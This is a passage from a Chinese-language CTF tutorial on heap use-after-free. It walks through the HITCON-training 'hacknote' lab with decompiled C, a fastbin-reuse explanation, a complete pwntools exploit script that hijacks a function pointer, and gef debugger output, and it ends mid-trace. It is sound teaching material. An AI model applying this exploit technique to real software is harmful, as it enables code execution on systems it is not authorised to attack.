class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ .&#x2F;use_after_free                      </span><br><span class="line">this is my function</span><br><span class="line">I can also use it</span><br><span class="line">call print my name</span><br><span class="line">this pogram will crash...</span><br><span class="line">[1]    38738 segmentation fault (core dumped)  .&#x2F;use_after_free</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">lab 10 hacknote</a> 为例。</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br></pre></td></tr></table></figure><p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p><h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  note *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0-&gt;content = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, notelist[i]-&gt;content, size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个 note 生成的具体流程</p><ol><li><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。</p></li><li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+                       </span><br><span class="line">|   put           |                       </span><br><span class="line">+-----------------+                       </span><br><span class="line">|   content       |       size              </span><br><span class="line">+-----------------+-------------------&gt;+----------------+</span><br><span class="line">                                       |     real       |</span><br><span class="line">                                       |    content     |</span><br><span class="line">                                       |                |</span><br><span class="line">                                       +----------------+</span><br></pre></td></tr></table></figure></li></ol><p>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>我们可以具体看一下执行的流程，首先先下断点</p><p><strong>两处 malloc 下断点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x0804875C</span><br><span class="line">Breakpoint 1 at 0x804875c</span><br><span class="line">gef➤  b *0x080486CA</span><br><span class="line">Breakpoint 2 at 0x80486ca</span><br></pre></td></tr></table></figure><p><strong>两处 free 下断点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048893</span><br><span class="line">Breakpoint 3 at 0x8048893</span><br><span class="line">gef➤  b *0x080488A9</span><br><span class="line">Breakpoint 4 at 0x80488a9</span><br></pre></td></tr></table></figure><p>然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x0804b008。（eax 存储函数返回值）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0804b008  →  0x00000000</span><br><span class="line">$ebx   : 0x00000000</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b008  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br><span class="line">    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax</span><br><span class="line">    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf10&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf10│+0x00: 0x00000008     ← $esp</span><br><span class="line">0xffffcf14│+0x04: 0x00000000</span><br><span class="line">0xffffcf18│+0x08: 0xf7e29ef5  →  &lt;strtol+5&gt; add eax, 0x18210b</span><br><span class="line">0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000</span><br><span class="line">0xffffcf24│+0x14: 0x00000000</span><br><span class="line">0xffffcf28│+0x18: 0x0000000a</span><br><span class="line">0xffffcf2c│+0x1c: 0x00000000</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line">[#0] 0x80486cf → Name: add_note()</span><br><span class="line">[#1] 0x8048ac5 → Name: main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x0804b008</span><br><span class="line">UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10)</span><br><span class="line">Chunk size: 16 (0x10)</span><br><span class="line">Usable size: 12 (0xc)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p><strong>申请 note 0 的 content 的地址为 0x0804b018</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0804b018  →  0x00000000</span><br><span class="line">$ebx   : 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b018  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000020</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br><span class="line">    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax</span><br><span class="line">    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf10&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf10│+0x00: 0x00000020     ← $esp</span><br><span class="line">0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233</span><br><span class="line">0xffffcf18│+0x08: 0x00000008</span><br><span class="line">0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000</span><br><span class="line">0xffffcf24│+0x14: 0x00000000</span><br><span class="line">0xffffcf28│+0x18: 0x0000000a</span><br><span class="line">0xffffcf2c│+0x1c: 0x00000000</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line">[#0] 0x8048761 → Name: add_note()</span><br><span class="line">[#1] 0x8048ac5 → Name: main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x0804b018</span><br><span class="line">UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28)</span><br><span class="line">Chunk size: 40 (0x28)</span><br><span class="line">Usable size: 36 (0x24)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x0804b040 和 0x0804b050。</p><p>同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  grep aaaa</span><br><span class="line">[+] Searching &#39;aaaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission&#x3D;rw-</span><br><span class="line">  0x804b018 - 0x804b01c  →   &quot;aaaa&quot; </span><br><span class="line">gef➤  grep ddaa</span><br><span class="line">[+] Searching &#39;ddaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission&#x3D;rw-</span><br><span class="line">  0x804b050 - 0x804b054  →   &quot;ddaa&quot; </span><br></pre></td></tr></table></figure><p>下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> →  0x8048893 